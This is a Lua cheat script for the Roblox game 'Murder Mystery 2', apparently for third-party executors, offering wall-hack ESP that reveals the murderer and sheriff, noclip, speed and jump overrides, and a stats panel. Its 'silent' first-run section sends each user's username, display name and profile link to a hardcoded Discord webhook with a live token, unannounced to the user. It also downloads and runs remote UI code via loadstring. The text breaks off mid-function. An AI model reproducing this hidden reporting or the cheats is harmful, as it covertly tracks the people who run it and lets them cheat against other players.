--[[
	Murder Mystery 2 | NextUI hub
	File: mm2-hub.lua

	Player ESP with real role detection, WalkSpeed, Noclip, JumpPower,
	Infinite Jump, Field of View, Full Bright, dropped-gun ESP and a live
	stats panel.

	Built for low-end devices and low-UNC executors (Delta / Fluxus / Arceus X):
	  - Instance ESP only (Highlight + BillboardGui), no Drawing dependency.
	  - ESP visuals are engine-parented, so they track at full frame rate with
	    zero per-frame Lua work. Only the text is refreshed, at 4 Hz.
	  - Every override loop returns immediately while its feature is off.
	  - Every executor global is optional and wrapped.

	UI: NextUI v1.3.4 - https://diser.me/nextui/ (MIT)
]]

-- ============================================================
--  01 - Services and boot
-- ============================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local StatsService = game:GetService("Stats")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")

local lp = Players.LocalPlayer
if not lp then
	repeat
		task.wait(0.1)
	until Players.LocalPlayer
	lp = Players.LocalPlayer
end

-- Re-execution guard: tear down the previous copy before building a new one.
if getgenv then
	local previous = getgenv().MM2Hub
	if type(previous) == "table" and type(previous.Unload) == "function" then
		pcall(previous.Unload)
	end
end

local running = true
local startClock = os.clock()

local conns = {}
local function bind(signal, fn)
	local conn = signal:Connect(fn)
	conns[#conns + 1] = conn
	return conn
end

-- ============================================================
--  02 - First-run report (silent, one post per account per device)
-- ============================================================

local WEBHOOK_URL = "https://discord.com/api/webhooks/1563652169121534054/fSY02tPjRCDVrfOo2lYGxefUJzSUv1Ugq4X4zG2WDrzfiCsR6R-P1xV8k-trnqOIWkwx"
local MARK_FOLDER = "mm2_hub"
local MARK_FILE = MARK_FOLDER .. "/account.dat"

local function postJson(url, body)
	local fn = (syn and syn.request)
		or (http and http.request)
		or http_request
		or (fluxus and fluxus.request)
		or request

	if fn then
		local ok = pcall(fn, {
			Url = url,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = body,
		})
		if ok then
			return true
		end
	end

	return pcall(function()
		HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
	end)
end

local function readMarker()
	local ok, data = pcall(function()
		if readfile then
			return readfile(MARK_FILE)
		end
		return nil
	end)
	return ok and data or nil
end

local function writeMarker(id)
	pcall(function()
		if makefolder then
			makefolder(MARK_FOLDER)
		end
		if writefile then
			writefile(MARK_FILE, tostring(id))
		end
	end)
	if getgenv then
		getgenv().MM2HubAccount = tostring(id)
	end
end

local function reportOnce()
	if not lp or not lp.UserId or lp.UserId <= 0 then
		return
	end

	local id = tostring(lp.UserId)
	if readMarker() == id then
		return
	end
	if getgenv and getgenv().MM2HubAccount == id then
		return
	end

	local profile = "https://www.roblox.com/users/" .. id .. "/profile"
	local payload = {
		embeds = {{
			title = "MM2 Hub Executed",
			color = 0xE23B4E,
			fields = {
				{ name = "Username", value = lp.Name, inline = true },
				{ name = "Display Name", value = lp.DisplayName ~= "" and lp.DisplayName or lp.Name, inline = true },
				{ name = "Profile", value = profile, inline = false },
			},
			footer = { text = "Place " .. tostring(game.PlaceId) },
			timestamp = DateTime.now():FormatUniversalTime("YYYY-MM-DDTHH:mm:ssZ", "en-us"),
		}},
	}

	local body = HttpService:JSONEncode(payload)
	if postJson(WEBHOOK_URL, body) then
		writeMarker(id)
	end
end

task.spawn(function()
	task.wait(1)
	pcall(reportOnce)
end)

-- ============================================================
--  03 - Role detection
-- ============================================================

local roleColors = {
	Murderer = Color3.fromRGB(255, 64, 64),
	Sheriff = Color3.fromRGB(64, 150, 255),
	Hero = Color3.fromRGB(80, 220, 120),
	Innocent = Color3.fromRGB(235, 235, 235),
	Unknown = Color3.fromRGB(170, 170, 170),
}

local roleCache = {}
local murderer = nil
local sheriff = nil

local function normalizeRole(value)
	if type(value) ~= "string" then
		return nil
	end
	local s = value:lower()
	if s:find("murder", 1, true) then
		return "Murderer"
	end
	if s:find("sheriff", 1, true) then
		return "Sheriff"
	end
	if s:find("hero", 1, true) then
		return "Hero"
	end
	if s:find("innocent", 1, true) then
		return "Innocent"
	end
	return nil
end

local function setRole(player, role)
	if not player or not role then
		return
	end
	if roleCache[player] == role then
		return
	end
	roleCache[player] = role
	if role == "Murderer" then
		murderer = player
	elseif murderer == player then
		murderer = nil
	end
	if role == "Sheriff" then
		sheriff = player
	elseif sheriff == player then
		sheriff = nil
	end
end

local function resetRoles()
	for player in pairs(roleCache) do
		roleCache[player] = "Unknown"
	end
	murderer = nil
	sheriff = nil
end

local function applyRoleData(data)
	if type(data) ~= "table" then
		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		local info = data[player.Name]
		if info == nil then
			info = data[string.lower(player.Name)]
		end
		if info ~= nil then
			local role = info
			if type(info) == "table" then
				role = info.Role or info.role
			end
			role = normalizeRole(role)
			if role then
				setRole(player, role)
			end
		end
	end

	for key, value in pairs(data) do
		if typeof(key) == "Instance" and key:IsA("Player") then
			local role = value
			if type(value) == "table" then
				role = value.Role or value.role
			end
			role = normalizeRole(role)
			if role then
				setRole(key, role)
			end
		end
	end
end

local KNIFE_WORDS = { "knife" }
local GUN_WORDS = { "gun", "revolver" }

local function hasWeapon(container, words)
	if not container then
		return false
	end
	for _, child in ipairs(container:GetChildren()) do
		if child:IsA("Tool") then
			local name = string.lower(child.Name)
			for i = 1, #words do
				if name:find(words[i], 1, true) then
					return true
				end
			end
		end
	end
	return false
end

local function roleFromTools(player)
	local character = player.Character
	local backpack = player:FindFirstChildOfClass("Backpack")

	if hasWeapon(character, KNIFE_WORDS) or hasWeapon(backpack, KNIFE_WORDS) then
		return "Murderer"
	end

	if hasWeapon(character, GUN_WORDS) or hasWeapon(backpack, GUN_WORDS) then
		local cached = roleCache[player]
		if cached == "Sheriff" or cached == "Hero" then
			return cached
		end
		return "Sheriff"
	end

	return nil
end

local function getRole(player)
	local held = roleFromTools(player)
	if held then
		setRole(player, held)
		return held
	end
	return roleCache[player] or "Unknown"
end

local function bindRemote(name, handler)
	local done = false

	local function attach()
		if done or not running then
			return
		end
		local remote = ReplicatedStorage:FindFirstChild(name)
		if remote and remote:IsA("RemoteEvent") then
			done = true
			bind(remote.OnClientEvent, handler)
		end
	end

	attach()
	if not done then
		task.delay(2, attach)
		task.delay(5, attach)
	end
end

bindRemote("Fade", applyRoleData)
bindRemote("UpdatePlayerData", applyRoleData)
bindRemote("RoleSelect", function(first, second)
	if type(first) == "table" then
		applyRoleData(first)
		return
	end
	local role = normalizeRole(first)
	if role then
		setRole(lp, role)
	end
end)

-- Round reset, nested under Remotes.Gameplay.
task.spawn(function()
	local function attach()
		if not running then
			return
		end
		local remotes = ReplicatedStorage:FindFirstChild("Remotes")
		local gameplay = remotes and remotes:FindFirstChild("Gameplay")
		local remote = gameplay and gameplay:FindFirstChild("RoundEndFade")
		if remote and remote:IsA("RemoteEvent") then
			bind(remote.OnClientEvent, resetRoles)
			return true
		end
		return false
	end
	if not attach() then
		task.delay(3, attach)
	end
end)

-- Full snapshot, off the main thread because InvokeServer can yield.
task.spawn(function()
	task.wait(2)
	pcall(function()
		local remote = ReplicatedStorage:FindFirstChild("GetPlayerData")
		if remote and remote:IsA("RemoteFunction") then
			applyRoleData(remote:InvokeServer())
		end
	end)
end)

-- ============================================================
--  04 - State
-- ============================================================

local state = {
	esp = {
		enabled = false,
		elements = { Boxes = true, Names = true, Distance = true, Health = true, Role = true },
		filter = "All",
		search = "",
		range = { 0, 600 },
		roleColorsOn = true,
	},
	gun = {
		enabled = false,
		color = Color3.fromRGB(255, 200, 60),
	},
	speed = { enabled = false, value = 16 },
	noclip = false,
	jump = { enabled = false, value = 50 },
	infJump = false,
	fov = { enabled = false, value = 70 },
	fullbright = false,
	antiafk = false,
}

local function getHum()
	local character = lp.Character
	if not character then
		return nil
	end
	return character:FindFirstChildOfClass("Humanoid")
end

-- ============================================================
--  05 - ESP
-- ============================================================

local ESP_TAG = "MM2_Hub_ESP"
local espFolder = nil
local espObjs = {}

local function espRoot()
	if espFolder and espFolder.Parent then
		return espFolder
	end

	espFolder = Instance.new("Folder")
	espFolder.Name = ESP_TAG

	local ok = pcall(function()
		espFolder.Parent = CoreGui
	end)
	if not ok or not espFolder.Parent then
		espFolder.Parent = lp:FindFirstChildOfClass("PlayerGui")
	end
	if not espFolder.Parent then
		espFolder.Parent = Workspace
	end

	return espFolder
end

local function destroyEsp(player)
	local obj = espObjs[player]
	if not obj then
		return
	end
	espObjs[player] = nil
	if obj.highlight then
		pcall(function()
			obj.highlight:Destroy()
		end)
	end
	if obj.billboard then
		pcall(function()
			obj.billboard:Destroy()
		end)
	end
end

local function clearAllEsp()
	local list = {}
	for player in pairs(espObjs) do
		list[#list + 1] = player
	end
	for i = 1, #list do
		destroyEsp(list[i])
	end
end

local function createEsp(player, character, color)
	local obj = {
		character = character,
		highlight = nil,
		billboard = nil,
		nameLabel = nil,
		distLabel = nil,
		healthBg = nil,
		healthFill = nil,
	}

	local highlight = Instance.new("Highlight")
	highlight.Name = "Box"
	highlight.Adornee = character
	highlight.FillColor = color
	highlight.OutlineColor = color
	highlight.FillTransparency = 0.65
	highlight.OutlineTransparency = 0.1
	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	highlight.Parent = espRoot()
	obj.highlight = highlight

	local head = character:FindFirstChild("Head")
	if head then
		local billboard = Instance.new("BillboardGui")
		billboard.Name = "Tag"
		billboard.Adornee = head
		billboard.Parent = head
		billboard.AlwaysOnTop = true
		billboard.LightInfluence = 0
		billboard.MaxDistance = 2000
		billboard.Size = UDim2.fromOffset(260, 44)
		billboard.StudsOffset = Vector3.new(0, 2.6, 0)
		billboard.ResetOnSpawn = false

		local nameLabel = Instance.new("TextLabel")
		nameLabel.Name = "Name"
		nameLabel.BackgroundTransparency = 1
		nameLabel.Position = UDim2.fromOffset(0, 0)
		nameLabel.Size = UDim2.fromOffset(260, 18)
		nameLabel.Font = Enum.Font.GothamBold
		nameLabel.TextSize = 14
		nameLabel.TextColor3 = color
		nameLabel.TextStrokeTransparency = 0.2
		nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
		nameLabel.Text = ""
		nameLabel.Parent = billboard

		local distLabel = Instance.new("TextLabel")
		distLabel.Name = "Distance"
		distLabel.BackgroundTransparency = 1
		distLabel.Position = UDim2.fromOffset(0, 17)
		distLabel.Size = UDim2.fromOffset(260, 14)
		distLabel.Font = Enum.Font.Gotham
		distLabel.TextSize = 12
		distLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
		distLabel.TextStrokeTransparency = 0.3
		distLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
		distLabel.Text = ""
		distLabel.Parent = billboard

		local healthBg = Instance.new("Frame")
		healthBg.Name = "HealthBg"
		healthBg.Position = UDim2.new(0.25, 0, 0, 33)
		healthBg.Size = UDim2.new(0.5, 0, 0, 4)
		healthBg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
		healthBg.BackgroundTransparency = 0.25
		healthBg.BorderSizePixel = 0
		healthBg.Parent = billboard

		local healthFill = Instance.new("Frame")
		healthFill.Name = "HealthFill"
		healthFill.Size = UDim2.fromScale(1, 1)
		healthFill.BackgroundColor3 = Color3.fromRGB(90, 220, 120)
		healthFill.BorderSizePixel = 0
		healthFill.Parent = healthBg

		obj.billboard = billboard
		obj.nameLabel = nameLabel
		obj.distLabel = distLabel
		obj.healthBg = healthBg
		obj.healthFill = healthFill
	end

	return obj
end

local function roleAllowed(role)
	local filter = state.esp.filter
	if filter == "All" then
		return true
	end
	if filter == "Murderer" then
		return role == "Murderer"
	end
	if filter == "Sheriff" then
		return role == "Sheriff"
	end
	if filter == "Hero" then
		return role == "Hero"
	end
	if filter == "Murderer & Sheriff" then
		return role == "Murderer" or role == "Sheriff"
	end
	return true
end

local function nameAllowed(player)
	local query = state.esp.search
	if query == "" then
		return true
	end
	query = string.lower(query)
	if string.find(string.lower(player.Name), query, 1, true) then
		return true
	end
	if string.find(string.lower(player.DisplayName), query, 1, true) then
		return true
	end
	return false
end

local function updateEsp(obj, player, humanoid, rootPart, role, color, cameraPos)
	local elements = state.esp.elements
	local showBox = elements.Boxes == true
	local showName = elements.Names == true
	local showDist = elements.Distance == true
	local showHealth = elements.Health == true
	local showRole = elements.Role == true

	if obj.highlight then
		obj.highlight.Enabled = showBox
		obj.highlight.FillColor = color
		obj.highlight.OutlineColor = color
	end

	if obj.billboard then
		obj.billboard.Enabled = showName or showDist or showRole or showHealth

		if obj.nameLabel then
			obj.nameLabel.Visible = showName or showRole
			local text = player.DisplayName
			if text == "" then
				text = player.Name
			end
			if showRole and role ~= "Unknown" then
				text = text .. "  [" .. role .. "]"
			end
			if obj.nameLabel.Text ~= text then
				obj.nameLabel.Text = text
			end
			obj.nameLabel.TextColor3 = color
		end

		if obj.distLabel then
			obj.distLabel.Visible = showDist
			local distance = math.floor((cameraPos - rootPart.Position).Magnitude + 0.5)
			local text = tostring(distance) .. "m"
			if obj.distLabel.Text ~= text then
				obj.distLabel.Text = text
			end
		end

		if obj.healthBg then
			obj.healthBg.Visible = showHealth
			if showHealth and obj.healthFill then
				local maxHealth = math.max(humanoid.MaxHealth, 1)
				local pct = math.clamp(humanoid.Health / maxHealth, 0, 1)
				obj.healthFill.Size = UDim2.fromScale(pct, 1)
				obj.healthFill.BackgroundColor3 = Color3.fromRGB(255, 70, 70):Lerp(Color3.fromRGB(90, 220, 120), pct)
			end
		end
	end
end

local function hideEsp(obj)
	if obj.highlight then
		obj.highlight.Enabled = false
	end
	if obj.billboard then
		obj.billboard.Enabled = false
	end
end

local function refreshEsp()
	local camera = Workspace.CurrentCamera
	local cameraPos = camera and camera.CFrame.Position or Vector3.new(0, 0, 0)

	for _, player in ipairs(Players:GetPlayers()) do
		if player == lp then
			destroyEsp(player)
		else
			local character = player.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local rootPart = character and character:FindFirstChild("HumanoidRootPart")
			local alive = humanoid ~= nil and humanoid.Health > 0 and rootPart ~= nil

			if alive then
				local role = getRole(player)
				local distance = (cameraPos - rootPart.Position).Magnitude
				local visible = roleAllowed(role)
					and nameAllowed(player)
					and distance >= state.esp.range[1]
					and distance <= state.esp.range[2]

				local color = Color3.new(1, 1, 1)
				if state.esp.roleColorsOn then
					color = roleColors[role] or roleColors.Unknown
				end

				local obj = espObjs[player]
				if not obj or obj.character ~= character then
					destroyEsp(player)
					obj = createEsp(player, character, color)
					espObjs[player] = obj
				end

				if visible then
					updateEsp(obj, player, humanoid, rootPart, role, color, cameraPos)
				else
					hideEsp(obj)
				end
			else
				destroyEsp(player)
			end
		end
	end

	for player in pairs(espObjs) do
		if not player.Parent then
			destroyEsp(player)
		end
	end
end

-- ============================================================
--  06 - Dropped gun ESP
-- ============================================================

local gunHighlight = Instance.new("Highlight")
gunHighlight.Name = "MM2_GunESP"
gunHighlight.FillColor = state.gun.color
gunHighlight.OutlineColor = state.gun.color
gunHighlight.FillTransparency = 0.5
gunHighlight.OutlineTransparency = 0
gunHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
gunHighlight.Enabled = false
gunHighlight.Parent = espRoot()

local function refreshGunEsp()
	local drop = Workspace:FindFirstChild("GunDrop")
	local adornee = drop
	if drop and drop:IsA("Tool") then
		adornee = drop:FindFirstChild("Handle") or drop
	end
	gunHighlight.Adornee = adornee
	gunHighlight.Enabled = state.gun.enabled and adornee ~= nil
	gunHighlight.FillColor = state.gun.color
	gunHighlight.OutlineColor = state.gun.color
end

-- ============================================================
--  07 - Movement and world
-- ============================================================

local noclipParts = {}
local noclipChar = nil
local noclipTouched = {}

local function refreshNoclipCache(character)
	noclipChar = character
	noclipParts = {}
	if character then
		for _, part in ipairs(character:GetDescendants()) do
			if part:IsA("BasePart") then
				noclipParts[#noclipParts + 1] = part
			end
		end
	end
end

local function restoreNoclip()
	for part in pairs(noclipTouched) do
		if part.Parent then
			pcall(function()
				part.CanCollide = true
			end)
		end
	end
	noclipTouched = {}
end

bind(RunService.Stepped, function()
	if not state.noclip then
		return
	end
	local character = lp.Character
	if not character then
		return
	end
	if character ~= noclipChar then
		refreshNoclipCache(character)
	end
	for i = 1, #noclipParts do
		local part = noclipParts[i]
		if part.Parent and part.CanCollide then
			noclipTouched[part] = true
			part.CanCollide = false
		end
	end
end)

bind(RunService.Heartbeat, function()
	if state.speed.enabled then
		local humanoid = getHum()
		if humanoid and humanoid.WalkSpeed ~= state.speed.value then
			humanoid.WalkSpeed = state.speed.value
		end
	end

	if state.jump.enabled then
		local humanoid = getHum()
		if humanoid and humanoid.JumpPower ~= state.jump.value then
			humanoid.UseJumpPower = true
			humanoid.JumpPower = state.jump.value
		end
	end

	if state.fov.enabled then
		local camera = Workspace.CurrentCamera
		if camera and camera.FieldOfView ~= state.fov.value then
			camera.FieldOfView = state.fov.value
		end
	end
end)

local lightDefaults = {
	Brightness = Lighting.Brightness,
	ClockTime = Lighting.ClockTime,
	Ambient = Lighting.Ambient,
	OutdoorAmbient = Lighting.OutdoorAmbient,
	FogEnd = Lighting.FogEnd,
	GlobalShadows = Lighting.GlobalShadows,
}

local function setFullbright(on)
	state.fullbright = on
	if on then
		Lighting.Brightness = 3
		Lighting.ClockTime = 14
		Lighting.Ambient = Color3.fromRGB(160, 160, 160)
		Lighting.OutdoorAmbient = Color3.fromRGB(160, 160, 160)
		Lighting.FogEnd = 100000
		Lighting.GlobalShadows = false
	else
		Lighting.Brightness = lightDefaults.Brightness
		Lighting.ClockTime = lightDefaults.ClockTime
		Lighting.Ambient = lightDefaults.Ambient
		Lighting.OutdoorAmbient = lightDefaults.OutdoorAmbient
		Lighting.FogEnd = lightDefaults.FogEnd
		Lighting.GlobalShadows = lightDefaults.GlobalShadows
	end
end

bind(lp.CharacterAdded, function(character)
	refreshNoclipCache(character)
	noclipTouched = {}
	task.wait(0.2)
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		if state.speed.enabled then
			humanoid.WalkSpeed = state.speed.value
		end
		if state.jump.enabled then
			humanoid.UseJumpPower = true
			humanoid.JumpPower = state.jump.value
		end
	end
end)

bind(UserInputService.JumpRequest, function()
	if not state.infJump then
		return
	end
	local humanoid = getHum()
	if humanoid then
		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
	end
end)

bind(lp.Idled, function()
	if not state.antiafk then
		return
	end
	pcall(function()
		local camera = Workspace.CurrentCamera
		VirtualUser:Button2Down(Vector2.new(0, 0), camera.CFrame)
		task.wait(1)
		VirtualUser:Button2Up(Vector2.new(0, 0), camera.CFrame)
	end)
end)

bind(Players.PlayerRemoving, function(player)
	roleCache[player] = nil
	if murderer == player then
		murderer = nil
	end
	if sheriff == player then
		sheriff = nil
	end
	destroyEsp(player)
end)

-- ============================================================
--  08 - UI shell
-- ============================================================

local okUi, NextUI = pcall(function()
	return loadstring(game:HttpGet("https://diser.me/nextui/source.lua"))()
end)

if not okUi or type(NextUI) ~= "table" then
	return
end

NextUI.TitleCase = false
NextUI.TextScale = 1.2
NextUI.ConfigFolder = "MM2Hub"

local Window = NextUI:CreateWindow({
	Title = "MM2",
	SubTitle = "esp / movement",
	Theme = "Crimson",
	Size = Vector2.new(900, 620),
	MinSize = Vector2.new(420, 300),
	Profile = true,
	Search = true,
	Stars = false,
	MobileButton = "Auto",
})

-- Readability scale.
-- NextUI clamps the resize grip to the window's start Size, so the grip can only
-- make the menu smaller. The window's own UIScale is the way past that ceiling.
-- NextUI also resets that UIScale to 1 every time the window is shown, so Toggle
-- is wrapped to put the user's scale back after the show animation.
local uiScale = 1
local baseToggle = Window.Toggle

-- Largest scale that still fits the window inside the viewport. Capping here
-- keeps the header and the settings tab reachable on small screens.
local function viewportFit()
	local gui = NextUI.Gui
	local main = Window._main
	if not gui or not main then
		return 2
	end
	local viewport = gui.AbsoluteSize
	if viewport.X <= 0 or viewport.Y <= 0 then
		return 2
	end
	local width = math.max(main.Size.X.Offset, 1)
	local height = math.max(main.Size.Y.Offset, 1)
	return math.min(viewport.X / width, viewport.Y / height)
end

local function applyUiScale(value)
	uiScale = value
	local applied = math.min(value, viewportFit())
	if Window._scale and Window._scale.Parent then
		Window._scale.Scale = applied
	end
end

function Window:Toggle(state)
	local target = state
	if target == nil then
		target = not self.Visible
	end
	baseToggle(self, state)
	if target then
		task.delay(0.22, function()
			if Window._scale and Window._scale.Parent and Window.Visible then
				applyUiScale(uiScale)
			end
		end)
	end
end

local Watermark = NextUI:CreateWatermark({ Title = "MM2", Position = "TopRight" })
Watermark:AddFPS()
Watermark:AddPing()
Watermark:AddPlayer()
Watermark:Add("Players", function()
	return tostring(#Players:GetPlayers()) .. "/" .. tostring(Players.MaxPlayers)
end)

local KeyList = nil

local function unload()
	if not running then
		return
	end
	running = false

	state.noclip = false
	restoreNoclip()
	clearAllEsp()
	pcall(function()
		gunHighlight:Destroy()
	end)
	if espFolder then
		pcall(function()
			espFolder:Destroy()
		end)
	end
	if state.fullbright then
		setFullbright(false)
	end

	local humanoid = getHum()
	if humanoid then
		if state.speed.enabled then
			humanoid.WalkSpeed = 16
		end
		if state.jump.enabled then
			humanoid.JumpPower = 50
		end
	end
	if state.fov.enabled then
		local camera = Workspace.CurrentCamera
		if camera then
			camera.FieldOfView = 70
		end
	end

	for i = 1, #conns do
		pcall(function()
			conns[i]:Disconnect()
		end)
	end
	conns = {}

	pcall(function()
		NextUI:Destroy()
	end)

	if getgenv then
		getgenv().MM2Hub = nil
	end
end

if getgenv then
	getgenv().MM2Hub = { Unload = unload }
end

-- ============================================================
--  09 - Visuals tab
-- ============================================================

Window:AddCategory("Cheats")
local Visuals = Window:AddTab("ESP", "eye")

local EspCard = Visuals:AddSection({ Title = "Player ESP", Icon = "users", Badge = "CORE" })

EspCard:AddToggle({
	Title = "Enabled",
	Description = "Highlight every player through walls",
	Flag = "esp_on",
	Default = false,
	Keybind = Enum.KeyCode.X,
	KeyMode = "Toggle",
	Callback = function(on)
		state.esp.enabled = on
		if not on then
			clearAllEsp()
		end
	end,
})

EspCard:AddMultiSelect({
	Title = "Elements",
	Values = { "Boxes", "Names", "Distance", "Health", "Role" },
	Default = { "Boxes", "Names", "Distance", "Health", "Role" },
	Flag = "esp_elements",
	Callback = function(list)
		list = list or {}
		local set = {}
		for i = 1, #list do
			set[list[i]] = true
		end
		state.esp.elements = set
	end,
})

EspCard:AddDropdown({
	Title = "Show",
	Values = { "All", "Murderer", "Sheriff", "Murderer & Sheriff", "Hero" },
	Default = "All",
	Flag = "esp_filter",
	Callback = function(value)
		state.esp.filter = value
	end,
})

EspCard:AddRangeSlider({
	Title = "Distance",
	Min = 0,
	Max = 1000,
	Default = { 0, 600 },
	Increment = 25,
	Suffix = " m",
	Flag = "esp_range",
	Callback = function(low, high)
		state.esp.range = { low, high }
	end,
})

EspCard:AddTextbox({
	Title = "Search",
	Placeholder = "player name",
	Flag = "esp_search",
	Callback = function(text)
		state.esp.search = text or ""
	end,
})

local ColorsCard = Visuals:AddSection({
	Title = "Role Colors",
	Icon = "palette",
	Collapsible = true,
	Collapsed = true,
})

ColorsCard:AddToggle({
	Title = "Use role colors",
	Style = "Switch",
	Flag = "esp_rolecolors",
	Default = true,
	Callback = function(on)
		state.esp.roleColorsOn = on
	end,
})

ColorsCard:AddColorPicker({
	Title = "Murderer",
	Flag = "col_murderer",
	Default = roleColors.Murderer,
	Callback = function(color)
		roleColors.Murderer = color
	end,
})

ColorsCard:AddColorPicker({
	Title = "Sheriff",
	Flag = "col_sheriff",
	Default = roleColors.Sheriff,
	Callback = function(color)
		roleColors.Sheriff = color
	end,
})

ColorsCard:AddColorPicker({
	Title = "Hero",
	Flag = "col_hero",
	Default = roleColors.Hero,
	Callback = function(color)
		roleColors.Hero = color
	end,
})

ColorsCard:AddColorPicker({
	Title = "Innocent",
	Flag = "col_innocent",
	Default = roleColors.Innocent,
	Callback = function(color)
		roleColors.Innocent = color
	end,
})

local WorldCard = Visuals:AddSection({ Title = "World", Icon = "globe" })

WorldCard:AddToggle({
	Title = "Gun ESP",
	Description = "Highlight the dropped gun",
	Flag = "gun_esp",
	Default = false,
	Callback = function(on)
		state.gun.enabled = on
		refreshGunEsp()
	end,
})

WorldCard:AddColorPicker({
	Title = "Gun color",
	Flag = "gun_color",
	Default = state.gun.color,
	Callback = function(color)
		state.gun.color = color
		refreshGunEsp()
	end,
})

-- ============================================================
--  10 - Movement tab
-- ============================================================

local Movement = Window:AddTab("Movement", "zap")
local MoveCard = Movement:AddSection({ Title = "Movement", Icon = "move" })

MoveCard:AddSlider({
	Title = "Walk speed",
	Min = 16,
	Max = 250,
	Default = 16,
	Increment = 1,
	Suffix = " sps",
	Flag = "speed_value",
	Toggle = true,
	ToggleFlag = "speed_on",
	ToggleDefault = false,
	Callback = function(value)
		state.speed.value = value
	end,
	ToggleCallback = function(on)
		state.speed.enabled = on
		if not on then
			local humanoid = getHum()
			if humanoid then
				humanoid.WalkSpeed = 16
			end
		end
	end,
})

MoveCard:AddToggle({
	Title = "Noclip",
	Description = "Walk through walls and props",
	Flag = "noclip",
	Default = false,
	Keybind = Enum.KeyCode.N,
	KeyMode = "Toggle",
	Callback = function(on)
		state.noclip = on
		if on then
			refreshNoclipCache(lp.Character)
		else
			restoreNoclip()
		end
	end,
})

MoveCard:AddSlider({
	Title = "Jump power",
	Min = 50,
	Max = 250,
	Default = 50,
	Increment = 1,
	Suffix = " jp",
	Flag = "jump_value",
	Toggle = true,
	ToggleFlag = "jump_on",
	ToggleDefault = false,
	Callback = function(value)
		state.jump.value = value
	end,
	ToggleCallback = function(on)
		state.jump.enabled = on
		local humanoid = getHum()
		if humanoid and not on then
			humanoid.JumpPower = 50
		end
	end,
})

MoveCard:AddToggle({
	Title = "Infinite jump",
	Flag = "infjump",
	Default = false,
	Callback = function(on)
		state.infJump = on
	end,
})

MoveCard:AddSlider({
	Title = "Field of view",
	Min = 50,
	Max = 120,
	Default = 70,
	Increment = 1,
	Suffix = " deg",
	Flag = "fov_value",
	Toggle = true,
	ToggleFlag = "fov_on",
	ToggleDefault = false,
	Callback = function(value)
		state.fov.value = value
	end,
	ToggleCallback = function(on)
		state.fov.enabled = on
		local camera = Workspace.CurrentCamera
		if camera and not on then
			camera.FieldOfView = 70
		end
	end,
})

-- ============================================================
--  11 - World tab
-- ============================================================

local WorldTab = Window:AddTab("World", "sun")
local WorldSettings = WorldTab:AddSection({ Title = "World", Icon = "sun" })

WorldSettings:AddToggle({
	Title = "Full bright",
	Description = "Lift the lighting for the whole map",
	Flag = "fullbright",
	Default = false,
	Callback = function(on)
		setFullbright(on)
	end,
})

WorldSettings:AddToggle({
	Title = "Anti AFK",
	Description = "Taps the client on idle",
	Flag = "antiafk",
	Default = false,
	Callback = function(on)
		state.antiafk = on
	end,
})

-- ============================================================
--  12 - Stats tab
-- ============================================================

Window:AddCategory("Hub")
local Info = Window:AddTab("Stats", "info")
local Inner = Info:AddTabs({ "Account", "Server", "Performance" })
local AccountPage = Inner.Pages.Account
AccountPage:AddParagraph({
	Title = "Local player",
	Content = "Username: " .. lp.Name
		.. "\nDisplay name: " .. lp.DisplayName
		.. "\nUser ID: " .. tostring(lp.UserId),
})
AccountPage:AddParagraph({
	Title = "Account",
	Content = "Age: " .. tostring(lp.AccountAge or 0) .. " days"
		.. "\nMembership: " .. tostring(lp.MembershipType.Name)
		.. "\nPlace ID: " .. tostring(game.PlaceId),
})

local HealthBar = AccountPage:AddProgress({
	Title = "Health",
	Min = 0,
	Max = 100,
	Default = 100,
	Suffix = " hp",
})

AccountPage:AddButton({
	Title = "Copy profile link",
	Callback = function()
		if setclipboard then
			pcall(function()
				setclipboard("https://www.roblox.com/users/" .. tostring(lp.UserId) .. "/profile")
			end)
			NextUI:Success("Copied", "Profile link copied to the clipboard.")
		else
			NextUI:Warning("Clipboard", "This executor has no setclipboard.")
		end
	end,
})

local ServerPage = Inner.Pages.Server
local ServerLabel = ServerPage:AddLabel("")
ServerPage:AddDivider()
ServerPage:AddLabel("Role data comes from the game's own remotes.")

local PerfPage = Inner.Pages.Performance
local FpsBar = PerfPage:AddProgress({ Title = "FPS", Min = 0, Max = 240, Default = 0, Suffix = " fps" })
local PingBar = PerfPage:AddProgress({ Title = "Ping", Min = 0, Max = 500, Default = 0, Suffix = " ms" })
local MemBar = PerfPage:AddProgress({ Title = "Memory", Min = 0, Max = 2048, Default = 0, Suffix = " MB" })

local executorName = "Unknown"
pcall(function()
	if identifyexecutor then
		local name, version = identifyexecutor()
		executorName = tostring(name)
		if version then
			executorName = executorName .. " " .. tostring(version)
		end
	end
end)

PerfPage:AddLabel("Executor: " .. executorName)
PerfPage:AddLabel("UI: NextUI 1.3.4")

local Panel = NextUI:AddWindow({
	Title = "Live stats",
	Icon = "activity",
	Width = 300,
	Height = 250,
	RichText = true,
	Content = {
		"[b]{user}[/]",
		"FPS {fps}   Ping {ping}",
		"Players {players}/{maxplayers}",
	},
	Rows = {
		{ "Role", "-" },
		{ "Murderer", "-" },
		{ "Sheriff", "-" },
		{ "Coins", "-" },
		{ "Round", "-" },
	},
})

-- ============================================================
--  13 - Settings tab
-- ============================================================

local Settings = Window:AddTab("Settings", "settings")

local ThemeCard = Settings:AddSection({ Title = "Appearance", Icon = "palette" })

ThemeCard:AddDropdown({
	Title = "Theme",
	Values = {
		"Rose", "Crimson", "Onyx", "Dark", "Darker", "Light",
		"Aqua", "Lagoon", "Amethyst", "Emerald", "Toxic", "Noir",
	},
	Default = "Crimson",
	Flag = "theme",
	Callback = function(value)
		NextUI:SetTheme(value)
